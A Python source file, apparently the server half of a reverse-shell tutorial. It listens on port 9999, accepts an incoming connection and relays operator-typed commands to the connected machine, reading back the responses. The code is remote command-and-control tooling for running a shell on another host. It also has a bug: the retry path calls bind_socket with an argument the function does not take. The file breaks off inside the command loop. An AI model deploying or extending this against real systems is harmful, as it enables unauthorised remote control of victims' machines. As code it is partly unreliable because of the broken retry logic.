import socket
import sys


def create_socket():
    try:
        global HOST
        global PORT
        global S
        HOST = ""
        PORT = 9999
        S = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global HOST
        global PORT
        global S
        print(f'Binding the Port {PORT}')
        S.bind((HOST, PORT))
        S.listen(5)
    except socket.error as msg:
        print('Socket Binding error' + str(msg) + '\n' + 'Retrying...')
        bind_socket((HOST, PORT))


# Establish connection a client (socket must be listening)
def socket_accept():
    conn, address = S.accept()
    print('Connection has been established! |' + ' IP ' +
          address[0] + ' | Port' + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            S.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
